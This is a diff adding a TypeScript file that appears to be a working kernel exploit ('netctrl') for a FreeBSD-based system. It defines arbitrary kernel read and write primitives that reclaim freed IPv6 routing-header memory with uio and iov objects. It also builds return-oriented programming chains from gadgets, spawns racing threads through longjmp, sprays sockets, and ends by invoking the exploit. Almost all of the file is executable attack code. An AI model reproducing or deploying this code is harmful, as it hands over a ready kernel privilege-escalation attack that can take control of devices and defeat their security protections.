@@ -1,0 +1,757 @@
+function kreadslow (addr: BigInt, size: number) {
+  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
+  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
+
+  // Memory exhaustion check
+  if (debugging.info.memory.available === 0) {
+    log('kreadslow - Memory exhausted before start')
+    cleanup()
+    return BigInt_Error
+  }
+
+  debug('kreadslow - Preparing buffers...')
+
+  // Prepare leak buffers.
+  const leak_buffers = new Array(UIO_THREAD_NUM)
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    leak_buffers[i] = malloc(size)
+  }
+
+  // Set send buf size.
+  write32(sockopt_val_buf, size)
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
+
+  // Fill queue.
+  write(new BigInt(uio_sock_1), tmp, size)
+
+  // Set iov length
+  write64(uioIovRead.add(0x08), size)
+
+  debug('kreadslow - Freeing triplets[1]=' + triplets[1])
+
+  // Free one.
+  free_rthdr(ipv6_socks[triplets[1]])
+
+  // Minimize footprint
+  const uio_leak_add = leak_rthdr.add(0x08)
+
+  debug('kreadslow - Starting uio reclaim loop...')
+
+  let count = 0
+  let zeroMemoryCount = 0
+  // Reclaim with uio.
+  while (count < 10000) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount = 0
+    }
+    count++
+    if (count % 100 === 1) {
+      debug('kreadslow - uio loop iter ' + count)
+    }
+    trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
+    sched_yield()
+
+    // Leak with other rthdr.
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
+
+    if (read32(uio_leak_add) === UIO_IOV_NUM) {
+      break
+    }
+
+    // Wake up all threads.
+    read(new BigInt(uio_sock_0), tmp, size)
+
+    for (let i = 0; i < UIO_THREAD_NUM; i++) {
+      read(new BigInt(uio_sock_0), leak_buffers[i], size)
+    }
+
+    wait_uio_writev()
+
+    // Fill queue.
+    write(new BigInt(uio_sock_1), tmp, size)
+  }
+
+  if (count === 10000) {
+    debug('kreadslow - Failed uio reclaim after 10000 iterations')
+    return BigInt_Error
+  }
+
+  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
+
+  const uio_iov = read64(leak_rthdr)
+  debug('kreadslow - uio_iov: ' + hex(uio_iov))
+
+  // Prepare uio reclaim buffer.
+  build_uio(msgIov, uio_iov, 0, true, addr, size)
+
+  debug('kreadslow - Freeing triplets[2]=' + triplets[2])
+
+  // Free second one.
+  free_rthdr(ipv6_socks[triplets[2]])
+
+  // Minimize footprint
+  const iov_leak_add = leak_rthdr.add(0x20)
+
+  debug('kreadslow - Starting iov reclaim loop...')
+
+  // Reclaim uio with iov.
+  let zeroMemoryCount2 = 0
+  let count2 = 0
+  while (true) {
+    count2++
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount2++
+      if (zeroMemoryCount2 >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount2 = 0
+    }
+    // Reclaim with iov.
+    trigger_iov_recvmsg()
+    sched_yield()
+
+    // Leak with other rthdr.
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
+
+    if (read32(iov_leak_add) === UIO_SYSSPACE) {
+      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
+      break
+    }
+
+    // Release iov spray.
+    write(new BigInt(iov_sock_1), tmp, 1)
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+  }
+
+  debug('kreadslow - Reading leak buffers...')
+
+  // Wake up all threads.
+  read(new BigInt(uio_sock_0), tmp, size)
+  // Read the results now.
+  let leak_buffer: BigInt = new BigInt(0)
+
+  const tag_val = new BigInt(0x41414141, 0x41414141)
+
+  // Get leak.
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    read(new BigInt(uio_sock_0), leak_buffers[i], size)
+    const val = read64(leak_buffers[i])
+    debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
+    if (!val.eq(tag_val)) {
+      debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
+      // Find triplet.
+      triplets[1] = find_triplet(triplets[0], -1)
+      debug('kreadslow - triplets[1]=' + triplets[1])
+      leak_buffer = leak_buffers[i].add(0)
+    }
+  }
+
+  // Workers should have finished earlier no need to wait
+  wait_uio_writev()
+
+  // Release iov spray.
+  write(new BigInt(iov_sock_1), tmp, 1)
+
+  if (leak_buffer.eq(0)) {
+    debug('kreadslow - No valid leak found')
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+    return BigInt_Error
+  }
+
+  debug('kreadslow - Finding triplets[2]...')
+
+  // Find triplet[2].
+  for (let retry = 0; retry < 3; retry++) {
+    triplets[2] = find_triplet(triplets[0], triplets[1])
+    if (triplets[2] !== -1) break
+    debug('kreadslow - triplets[2] retry ' + (retry + 1))
+    sched_yield()
+  }
+  debug('kreadslow - triplets[2]=' + triplets[2])
+
+  if (triplets[2] === -1) {
+    debug('kreadslow - Failed to find triplets[2]')
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+    return BigInt_Error
+  }
+
+  // Let's make sure that they are indeed triplets
+  // const leak_0 = malloc(8);
+  // const leak_1 = malloc(8);
+  // const leak_2 = malloc(8);
+
+  // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
+  // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
+  // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
+
+  // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );
+
+  // Workers should have finished earlier no need to wait
+  wait_iov_recvmsg()
+  read(new BigInt(iov_sock_0), tmp, 1)
+
+  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
+
+  return leak_buffer
+}
+
+function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
+  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
+  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
+
+  // Set send buf size.
+  write32(sockopt_val_buf, size)
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
+
+  // Set iov length.
+  write64(uioIovWrite.add(0x08), size)
+
+  // Free first triplet.
+  free_rthdr(ipv6_socks[triplets[1]])
+
+  // Minimize footprint
+  const uio_leak_add = leak_rthdr.add(0x08)
+
+  // Reclaim with uio.
+  let zeroMemoryCount = 0
+  while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount = 0
+    }
+    trigger_uio_readv() // COMMAND_UIO_WRITE in fl0w's
+    sched_yield()
+
+    // Leak with other rthdr.
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
+
+    if (read32(uio_leak_add) === UIO_IOV_NUM) {
+      // debug("Break on reclaim with uio");
+      break
+    }
+
+    // Wake up all threads.
+    for (let i = 0; i < UIO_THREAD_NUM; i++) {
+      write(new BigInt(uio_sock_1), buffer, size)
+    }
+
+    wait_uio_readv()
+  }
+
+  const uio_iov = read64(leak_rthdr)
+  // debug("This is uio_iov: " + hex(uio_iov));
+
+  // Prepare uio reclaim buffer.
+  build_uio(msgIov, uio_iov, 0, false, addr, size)
+
+  // Free second one.
+  free_rthdr(ipv6_socks[triplets[2]])
+
+  // Minimize footprint
+  const iov_leak_add = leak_rthdr.add(0x20)
+
+  // Reclaim uio with iov.
+  let zeroMemoryCount2 = 0
+  while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount2++
+      if (zeroMemoryCount2 >= 5) {
+        log('netctrl failed!')
+        cleanup()
+        return BigInt_Error
+      }
+    } else {
+      zeroMemoryCount2 = 0
+    }
+    // Reclaim with iov.
+    trigger_iov_recvmsg()
+    sched_yield()
+
+    // Leak with other rthdr.
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
+
+    if (read32(iov_leak_add) === UIO_SYSSPACE) {
+      // debug("Break on reclaim uio with iov");
+      break
+    }
+
+    // Release iov spray.
+    write(new BigInt(iov_sock_1), tmp, 1)
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+  }
+
+  // Corrupt data.
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    write(new BigInt(uio_sock_1), buffer, size)
+  }
+
+  // Find triplet.
+  triplets[1] = find_triplet(triplets[0], -1)
+
+  // Workers should have finished earlier no need to wait
+  wait_uio_readv()
+
+  // Release iov spray.
+  write(new BigInt(iov_sock_1), tmp, 1)
+
+  // Find triplet[2].
+  for (let retry = 0; retry < 3; retry++) {
+    triplets[2] = find_triplet(triplets[0], triplets[1])
+    if (triplets[2] !== -1) break
+    sched_yield()
+  }
+
+  if (triplets[2] === -1) {
+    debug('kwriteslow - Failed to find triplets[2]')
+    wait_iov_recvmsg()
+    read(new BigInt(iov_sock_0), tmp, 1)
+    return BigInt_Error
+  }
+
+  // Workers should have finished earlier no need to wait
+  wait_iov_recvmsg()
+  read(new BigInt(iov_sock_0), tmp, 1)
+
+  return new BigInt(0)
+}
+
+function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
+  let new_rop_entry = last_rop_entry.add(8)
+  let copy_entry = last_rop_entry.sub(number_entries * 8).add(8)   // We add 8 to have the first ROP instruction add
+  const rop_loop = last_rop_entry.sub(number_entries * 8).add(8)     // We add 8 to have the first ROP instruction add
+
+  for (let i = 0; i < number_entries; i++) {
+    const entry_add = copy_entry
+    const entry_val = read64(copy_entry)
+
+    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET)
+    write64(new_rop_entry.add(0x8), entry_add)
+    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET)
+    write64(new_rop_entry.add(0x18), entry_val)
+    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+    copy_entry = copy_entry.add(8)
+    new_rop_entry = new_rop_entry.add(0x28)
+  }
+
+  // Time to jump back
+  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET)
+  write64(new_rop_entry.add(0x8), rop_loop)
+}
+
+function spawn_thread (rop_array: BigInt[], loop_entries: number, predefinedStack?: BigInt) {
+  const rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600)
+
+  // const rop_addr = malloc(size); // ROP Stack plus extra size
+
+  // Fill ROP Stack
+  for (let i = 0; i < rop_array.length; i++) {
+    write64(rop_addr.add(i * 8), rop_array[i]!)
+    // debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
+  }
+
+  // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
+  // loop_entries indicates the number of stack entries we need to regenerate
+  if (loop_entries !== 0) {
+    const last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8) // We pass the add of the last ROP instruction
+    rop_regen_and_loop(last_rop_entry, loop_entries)
+    // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
+  }
+
+  const jmpbuf = malloc(0x60)
+
+  // FreeBSD amd64 jmp_buf layout:
+  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
+  write64(jmpbuf.add(0x00), gadgets.RET)         // RIP - ret gadget
+  write64(jmpbuf.add(0x10), rop_addr)      // RSP - pivot to ROP chain
+  write32(jmpbuf.add(0x40), saved_fpu_ctrl) // FPU control
+  write32(jmpbuf.add(0x44), saved_mxcsr)    // MXCSR
+
+  const stack_size = new BigInt(0x100)
+  const tls_size = new BigInt(0x40)
+
+  const stack = malloc(Number(stack_size))
+  const tls = malloc(Number(tls_size))
+
+  write64(spawn_thr_args.add(0x00), longjmp_addr)       // start_func = longjmp
+  write64(spawn_thr_args.add(0x08), jmpbuf)             // arg = jmpbuf
+  write64(spawn_thr_args.add(0x10), stack)              // stack_base
+  write64(spawn_thr_args.add(0x18), stack_size)         // stack_size
+  write64(spawn_thr_args.add(0x20), tls)                // tls_base
+  write64(spawn_thr_args.add(0x28), tls_size)           // tls_size
+  write64(spawn_thr_args.add(0x30), spawn_tid)           // child_tid (output)
+  write64(spawn_thr_args.add(0x38), spawn_cpid)               // parent_tid (output)
+
+  const result = thr_new(spawn_thr_args, 0x68)
+  // debug("thr_new result: " + hex(result));
+  if (!result.eq(0)) {
+    throw new Error('thr_new failed: ' + hex(result))
+  }
+  return read64(spawn_tid)
+}
+
+function iov_recvmsg_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+  const rop: BigInt[] = []
+
+  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
+
+  const cpu_mask = malloc(0x10)
+  write16(cpu_mask, 1 << MAIN_CORE)
+
+  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(1))                        // CPU_WHICH_TID
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(BigInt_Error)   // id = -1 (current thread)
+  rop.push(gadgets.POP_RCX_RET)
+  rop.push(new BigInt(0x10))                     // setsize
+  rop.push(gadgets.POP_R8_RET)
+  rop.push(cpu_mask)
+  rop.push(cpuset_setaffinity_wrapper)
+
+  const rtprio_buf = malloc(4)
+  write16(rtprio_buf, PRI_REALTIME)
+  write16(rtprio_buf.add(2), MAIN_RTPRIO)
+
+  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(1))         // RTP_SET
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(rtprio_buf)
+  rop.push(rtprio_thread_wrapper)
+
+  // Signal ready - write 1 to ready_signal
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(ready_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_init = rop.length
+
+  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(run_fd)
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(1))
+  rop.push(read_wrapper)
+
+  // recvmsg(iov_sock_0, msg, 0)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(iov_sock_0))
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(msg)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(0))
+  rop.push(recvmsg_wrapper)
+
+  // Signal done - write 1 to deletion_signal
+  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
+  rop.push(done_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_end = rop.length
+  const loop_size = loop_end - loop_init
+  // It's gonna loop
+
+  return {
+    rop,
+    loop_size
+  }
+}
+
+function uio_readv_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+  const rop: BigInt[] = []
+
+  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
+
+  const cpu_mask = malloc(0x10)
+  write16(cpu_mask, 1 << MAIN_CORE)
+
+  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(1))                        // CPU_WHICH_TID
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(BigInt_Error)   // id = -1 (current thread)
+  rop.push(gadgets.POP_RCX_RET)
+  rop.push(new BigInt(0x10))                     // setsize
+  rop.push(gadgets.POP_R8_RET)
+  rop.push(cpu_mask)
+  rop.push(cpuset_setaffinity_wrapper)
+
+  const rtprio_buf = malloc(4)
+  write16(rtprio_buf, PRI_REALTIME)
+  write16(rtprio_buf.add(2), MAIN_RTPRIO)
+
+  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(1))         // RTP_SET
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(rtprio_buf)
+  rop.push(rtprio_thread_wrapper)
+
+  // Signal ready - write 1 to ready_signal
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(ready_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_init = rop.length
+
+  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(run_fd)
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(1))
+  rop.push(read_wrapper)
+
+  // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(uio_sock_0))
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(uioIovWrite)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(UIO_IOV_NUM))
+  rop.push(readv_wrapper)
+
+  // Signal done - write 1 to deletion_signal
+  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
+  rop.push(done_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_end = rop.length
+  const loop_size = loop_end - loop_init
+  // It's gonna loop
+
+  return {
+    rop,
+    loop_size
+  }
+}
+
+function uio_writev_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+  const rop: BigInt[] = []
+
+  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
+
+  const cpu_mask = malloc(0x10)
+  write16(cpu_mask, 1 << MAIN_CORE)
+
+  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(1))                        // CPU_WHICH_TID
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(BigInt_Error)   // id = -1 (current thread)
+  rop.push(gadgets.POP_RCX_RET)
+  rop.push(new BigInt(0x10))                     // setsize
+  rop.push(gadgets.POP_R8_RET)
+  rop.push(cpu_mask)
+  rop.push(cpuset_setaffinity_wrapper)
+
+  const rtprio_buf = malloc(4)
+  write16(rtprio_buf, PRI_REALTIME)
+  write16(rtprio_buf.add(2), MAIN_RTPRIO)
+
+  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(1))         // RTP_SET
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(rtprio_buf)
+  rop.push(rtprio_thread_wrapper)
+
+  // Signal ready - write 1 to ready_signal
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(ready_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_init = rop.length
+
+  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(run_fd)
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(1))
+  rop.push(read_wrapper)
+
+  // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(uio_sock_1))
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(uioIovRead)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(UIO_IOV_NUM))
+  rop.push(writev_wrapper)
+
+  // Signal done - write 1 to deletion_signal
+  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
+  rop.push(done_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_end = rop.length
+  const loop_size = loop_end - loop_init
+  // It's gonna loop
+
+  return {
+    rop,
+    loop_size
+  }
+}
+
+function ipv6_sock_spray_and_read_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+  const rop: BigInt[] = []
+
+  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
+
+  const cpu_mask = malloc(0x10)
+  write16(cpu_mask, 1 << MAIN_CORE)
+
+  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(1))                        // CPU_WHICH_TID
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(BigInt_Error)   // id = -1 (current thread)
+  rop.push(gadgets.POP_RCX_RET)
+  rop.push(new BigInt(0x10))                     // setsize
+  rop.push(gadgets.POP_R8_RET)
+  rop.push(cpu_mask)
+  rop.push(cpuset_setaffinity_wrapper)
+
+  const rtprio_buf = malloc(4)
+  write16(rtprio_buf, PRI_REALTIME)
+  write16(rtprio_buf.add(2), MAIN_RTPRIO)
+
+  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(1))         // RTP_SET
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(rtprio_buf)
+  rop.push(rtprio_thread_wrapper)
+
+  // Signal ready - write 1 to ready_signal
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(ready_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  const loop_init = rop.length
+
+  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(run_fd)
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(1))
+  rop.push(read_wrapper)
+
+  // Spray all sockets
+  for (let i = 0; i < ipv6_socks.length; i++) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(ipv6_socks[i])
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(IPPROTO_IPV6))
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(new BigInt(IPV6_RTHDR))
+    rop.push(gadgets.POP_RCX_RET)
+    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)) // Offset for socket i
+
+    // debug("");
+    // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));
+
+    rop.push(gadgets.POP_R8_RET)
+    rop.push(new BigInt(spray_rthdr_len))
+    rop.push(setsockopt_wrapper)
+  }
+
+  // After spraying, read all sockets into buffer array
+  for (let i = 0; i < ipv6_socks.length; i++) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(ipv6_socks[i])
+    // debug("");
+    // debug("pushed sock: " + hex(ipv6_socks[i]));
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(IPPROTO_IPV6))
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(new BigInt(IPV6_RTHDR))
+    rop.push(gadgets.POP_RCX_RET)
+    rop.push(read_rthdr_rop.add(i * 8))  // Offset for socket i
+    // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
+    rop.push(gadgets.POP_R8_RET)
+    rop.push(check_len)
+    rop.push(getsockopt_wrapper)
+  }
+
+  // Signal done - write 1 to deletion_signal
+  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
+  rop.push(done_signal)
+  rop.push(gadgets.POP_RAX_RET)
+  rop.push(new BigInt(1))
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+
+  // Exit
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(0))
+  rop.push(thr_exit_wrapper)
+
+  // It's gonna loop
+
+  return {
+    rop,
+    loop_size: 0// loop_size
+  }
+}
+
+netctrl_exploit()
+// cleanup();
